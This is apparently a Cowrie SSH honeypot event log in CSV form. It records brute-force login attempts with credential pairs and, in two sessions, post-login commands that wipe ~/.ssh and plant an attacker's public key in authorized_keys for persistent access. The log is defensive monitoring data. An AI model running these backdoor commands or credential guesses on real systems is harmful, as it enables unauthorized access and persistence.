eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.client.kex,93.123.85.205,,,,015480145156,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:13:03.702345Z
cowrie.login.failed,93.123.85.205,,,,015480145156,,,,,login attempt [deploy/abcd1] failed,localhost,2024-11-24T06:13:07.123881Z
cowrie.session.closed,93.123.85.205,,,,015480145156,,,,,Connection lost after 5 seconds,localhost,2024-11-24T06:13:08.334312Z
cowrie.session.connect,139.59.11.84,58544,172.233.154.19,2222,958c7139bc0a,ssh,,,,New connection: 139.59.11.84:58544 (172.233.154.19:2222) [session: 958c7139bc0a],localhost,2024-11-24T06:13:19.116822Z
cowrie.client.version,139.59.11.84,,,,958c7139bc0a,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T06:13:19.120401Z
cowrie.client.kex,139.59.11.84,,,,958c7139bc0a,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:13:19.317893Z
cowrie.login.failed,139.59.11.84,,,,958c7139bc0a,,,,,login attempt [admin/ChangeMe] failed,localhost,2024-11-24T06:13:20.119788Z
cowrie.session.closed,139.59.11.84,,,,958c7139bc0a,,,,,Connection lost after 2 seconds,localhost,2024-11-24T06:13:21.321833Z
cowrie.session.connect,152.32.203.233,59388,172.233.154.19,2222,b9c45d15ce90,ssh,,,,New connection: 152.32.203.233:59388 (172.233.154.19:2222) [session: b9c45d15ce90],localhost,2024-11-24T06:13:25.510931Z
cowrie.client.version,152.32.203.233,,,,b9c45d15ce90,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T06:13:25.511532Z
cowrie.client.kex,152.32.203.233,,,,b9c45d15ce90,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:13:25.615302Z
cowrie.login.success,152.32.203.233,,,,b9c45d15ce90,,,,,login attempt [root/qweasdzxc1] succeeded,localhost,2024-11-24T06:13:26.070843Z
cowrie.session.params,152.32.203.233,,,,b9c45d15ce90,,,,,[],localhost,2024-11-24T06:13:26.295688Z
cowrie.command.input,152.32.203.233,,,,b9c45d15ce90,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-11-24T06:13:26.296047Z
cowrie.command.failed,152.32.203.233,,,,b9c45d15ce90,,,,,Command not found: lockr -ia .ssh,localhost,2024-11-24T06:13:26.296662Z
cowrie.log.closed,152.32.203.233,,,,b9c45d15ce90,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-11-24T06:13:26.545548Z
cowrie.session.params,152.32.203.233,,,,b9c45d15ce90,,,,,[],localhost,2024-11-24T06:13:26.667599Z
cowrie.command.input,152.32.203.233,,,,b9c45d15ce90,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-11-24T06:13:26.667965Z
cowrie.session.file_download,152.32.203.233,,,,b9c45d15ce90,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-11-24T06:13:26.773172Z
cowrie.log.closed,152.32.203.233,,,,b9c45d15ce90,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-11-24T06:13:26.773574Z
cowrie.session.connect,152.32.203.233,59400,172.233.154.19,2222,629b27ce33c4,ssh,,,,New connection: 152.32.203.233:59400 (172.233.154.19:2222) [session: 629b27ce33c4],localhost,2024-11-24T06:13:26.883165Z
cowrie.client.version,152.32.203.233,,,,629b27ce33c4,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T06:13:26.883552Z
cowrie.client.kex,152.32.203.233,,,,629b27ce33c4,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:13:26.990526Z
cowrie.login.failed,152.32.203.233,,,,629b27ce33c4,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-11-24T06:13:27.459185Z
cowrie.session.closed,152.32.203.233,,,,629b27ce33c4,,,,,Connection lost after 1 seconds,localhost,2024-11-24T06:13:28.568510Z
cowrie.session.connect,152.32.203.233,59402,172.233.154.19,2222,3c6dbc7821fd,ssh,,,,New connection: 152.32.203.233:59402 (172.233.154.19:2222) [session: 3c6dbc7821fd],localhost,2024-11-24T06:13:28.681373Z
cowrie.client.version,152.32.203.233,,,,3c6dbc7821fd,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T06:13:28.681932Z
cowrie.client.kex,152.32.203.233,,,,3c6dbc7821fd,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:13:28.791936Z
cowrie.login.success,152.32.203.233,,,,3c6dbc7821fd,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-11-24T06:13:29.272720Z
cowrie.session.closed,152.32.203.233,,,,b9c45d15ce90,,,,,Connection lost after 3 seconds,localhost,2024-11-24T06:13:29.376807Z
cowrie.session.closed,152.32.203.233,,,,3c6dbc7821fd,,,,,Connection lost after 0 seconds,localhost,2024-11-24T06:13:29.383471Z
cowrie.session.connect,172.104.11.46,29344,172.233.154.19,2222,8fb88f3d548f,ssh,,,,New connection: 172.104.11.46:29344 (172.233.154.19:2222) [session: 8fb88f3d548f],localhost,2024-11-24T06:13:48.446433Z
cowrie.client.version,172.104.11.46,,,,8fb88f3d548f,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-24T06:13:48.586905Z
cowrie.client.kex,172.104.11.46,,,,8fb88f3d548f,,,4e066189c3bbeec38c99b1855113733a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a,localhost,2024-11-24T06:13:48.587528Z
cowrie.session.connect,115.186.131.194,54750,172.233.154.19,2222,d51c16709afc,ssh,,,,New connection: 115.186.131.194:54750 (172.233.154.19:2222) [session: d51c16709afc],localhost,2024-11-24T06:13:49.132710Z
cowrie.client.version,115.186.131.194,,,,d51c16709afc,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T06:13:49.133474Z
cowrie.session.closed,172.104.11.46,,,,8fb88f3d548f,,,,,Connection lost after 0 seconds,localhost,2024-11-24T06:13:49.251628Z
cowrie.session.connect,172.104.11.46,29356,172.233.154.19,2222,3c2ab6adb13e,ssh,,,,New connection: 172.104.11.46:29356 (172.233.154.19:2222) [session: 3c2ab6adb13e],localhost,2024-11-24T06:13:49.332011Z
cowrie.client.kex,115.186.131.194,,,,d51c16709afc,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:13:49.437096Z
cowrie.session.connect,172.188.59.232,46320,172.233.154.19,2222,5020064ca5c7,ssh,,,,New connection: 172.188.59.232:46320 (172.233.154.19:2222) [session: 5020064ca5c7],localhost,2024-11-24T06:13:49.669389Z
cowrie.client.version,172.188.59.232,,,,5020064ca5c7,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T06:13:49.669946Z
cowrie.client.version,172.104.11.46,,,,3c2ab6adb13e,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-24T06:13:49.818526Z
cowrie.client.kex,172.104.11.46,,,,3c2ab6adb13e,,,4e066189c3bbeec38c99b1855113733a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a,localhost,2024-11-24T06:13:49.819099Z
cowrie.client.kex,172.188.59.232,,,,5020064ca5c7,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:13:49.851744Z
cowrie.session.closed,172.104.11.46,,,,3c2ab6adb13e,,,,,Connection lost after 1 seconds,localhost,2024-11-24T06:13:50.579425Z
cowrie.login.failed,172.188.59.232,,,,5020064ca5c7,,,,,login attempt [steam/password] failed,localhost,2024-11-24T06:13:50.619311Z
cowrie.session.connect,172.104.11.46,29366,172.233.154.19,2222,e5ddcf70b55d,ssh,,,,New connection: 172.104.11.46:29366 (172.233.154.19:2222) [session: e5ddcf70b55d],localhost,2024-11-24T06:13:50.678855Z
cowrie.login.failed,115.186.131.194,,,,d51c16709afc,,,,,login attempt [ubuntu/secret] failed,localhost,2024-11-24T06:13:50.692483Z
cowrie.client.version,172.104.11.46,,,,e5ddcf70b55d,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-24T06:13:50.954364Z
cowrie.client.kex,172.104.11.46,,,,e5ddcf70b55d,,,4e066189c3bbeec38c99b1855113733a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a,localhost,2024-11-24T06:13:50.954926Z
cowrie.session.closed,172.104.11.46,,,,e5ddcf70b55d,,,,,Connection lost after 0 seconds,localhost,2024-11-24T06:13:51.367982Z
cowrie.session.closed,172.188.59.232,,,,5020064ca5c7,,,,,Connection lost after 2 seconds,localhost,2024-11-24T06:13:51.803302Z
cowrie.session.closed,115.186.131.194,,,,d51c16709afc,,,,,Connection lost after 2 seconds,localhost,2024-11-24T06:13:51.997551Z
cowrie.session.connect,139.59.11.84,36300,172.233.154.19,2222,f6d99881fbd0,ssh,,,,New connection: 139.59.11.84:36300 (172.233.154.19:2222) [session: f6d99881fbd0],localhost,2024-11-24T06:14:48.072786Z
cowrie.client.version,139.59.11.84,,,,f6d99881fbd0,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T06:14:48.073396Z
cowrie.client.kex,139.59.11.84,,,,f6d99881fbd0,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:14:48.279986Z
cowrie.login.failed,139.59.11.84,,,,f6d99881fbd0,,,,,login attempt [admin02/admin02!123] failed,localhost,2024-11-24T06:14:49.150430Z
cowrie.session.closed,139.59.11.84,,,,f6d99881fbd0,,,,,Connection lost after 2 seconds,localhost,2024-11-24T06:14:50.359371Z
cowrie.session.connect,152.32.203.233,44440,172.233.154.19,2222,a52d6b857cab,ssh,,,,New connection: 152.32.203.233:44440 (172.233.154.19:2222) [session: a52d6b857cab],localhost,2024-11-24T06:15:12.726957Z
cowrie.client.version,152.32.203.233,,,,a52d6b857cab,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T06:15:12.727670Z
cowrie.client.kex,152.32.203.233,,,,a52d6b857cab,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:15:12.845900Z
cowrie.login.success,152.32.203.233,,,,a52d6b857cab,,,,,login attempt [root/P4rol4@abc] succeeded,localhost,2024-11-24T06:15:13.358229Z
cowrie.session.params,152.32.203.233,,,,a52d6b857cab,,,,,[],localhost,2024-11-24T06:15:13.612519Z
cowrie.command.input,152.32.203.233,,,,a52d6b857cab,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-11-24T06:15:13.612889Z
cowrie.command.failed,152.32.203.233,,,,a52d6b857cab,,,,,Command not found: lockr -ia .ssh,localhost,2024-11-24T06:15:13.613530Z
cowrie.log.closed,152.32.203.233,,,,a52d6b857cab,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-11-24T06:15:13.890085Z
cowrie.session.params,152.32.203.233,,,,a52d6b857cab,,,,,[],localhost,2024-11-24T06:15:14.026819Z
cowrie.command.input,152.32.203.233,,,,a52d6b857cab,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-11-24T06:15:14.027199Z
cowrie.session.file_download,152.32.203.233,,,,a52d6b857cab,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-11-24T06:15:14.146809Z
cowrie.log.closed,152.32.203.233,,,,a52d6b857cab,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-11-24T06:15:14.147535Z
cowrie.session.connect,152.32.203.233,32968,172.233.154.19,2222,1610613f1185,ssh,,,,New connection: 152.32.203.233:32968 (172.233.154.19:2222) [session: 1610613f1185],localhost,2024-11-24T06:15:14.252847Z
cowrie.client.version,152.32.203.233,,,,1610613f1185,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T06:15:14.253380Z
cowrie.client.kex,152.32.203.233,,,,1610613f1185,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:15:14.364510Z
cowrie.login.failed,152.32.203.233,,,,1610613f1185,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-11-24T06:15:14.850034Z
cowrie.session.closed,152.32.203.233,,,,1610613f1185,,,,,Connection lost after 1 seconds,localhost,2024-11-24T06:15:15.963560Z
cowrie.session.connect,152.32.203.233,32970,172.233.154.19,2222,2fa6c60ccf4e,ssh,,,,New connection: 152.32.203.233:32970 (172.233.154.19:2222) [session: 2fa6c60ccf4e],localhost,2024-11-24T06:15:16.068739Z
cowrie.client.version,152.32.203.233,,,,2fa6c60ccf4e,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T06:15:16.069214Z
cowrie.client.kex,152.32.203.233,,,,2fa6c60ccf4e,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:15:16.175384Z
cowrie.login.success,152.32.203.233,,,,2fa6c60ccf4e,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-11-24T06:15:16.640611Z
cowrie.session.closed,152.32.203.233,,,,2fa6c60ccf4e,,,,,Connection lost after 0 seconds,localhost,2024-11-24T06:15:16.747661Z
cowrie.session.closed,152.32.203.233,,,,a52d6b857cab,,,,,Connection lost after 4 seconds,localhost,2024-11-24T06:15:16.751886Z
cowrie.session.connect,115.186.131.194,35686,172.233.154.19,2222,f22caaaef5e8,ssh,,,,New connection: 115.186.131.194:35686 (172.233.154.19:2222) [session: f22caaaef5e8],localhost,2024-11-24T06:15:24.452154Z
cowrie.client.version,115.186.131.194,,,,f22caaaef5e8,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T06:15:24.452821Z
cowrie.client.kex,115.186.131.194,,,,f22caaaef5e8,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:15:24.749208Z
cowrie.session.connect,172.188.59.232,34728,172.233.154.19,2222,9cc4748dba78,ssh,,,,New connection: 172.188.59.232:34728 (172.233.154.19:2222) [session: 9cc4748dba78],localhost,2024-11-24T06:15:24.772538Z
cowrie.client.version,172.188.59.232,,,,9cc4748dba78,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T06:15:24.773206Z
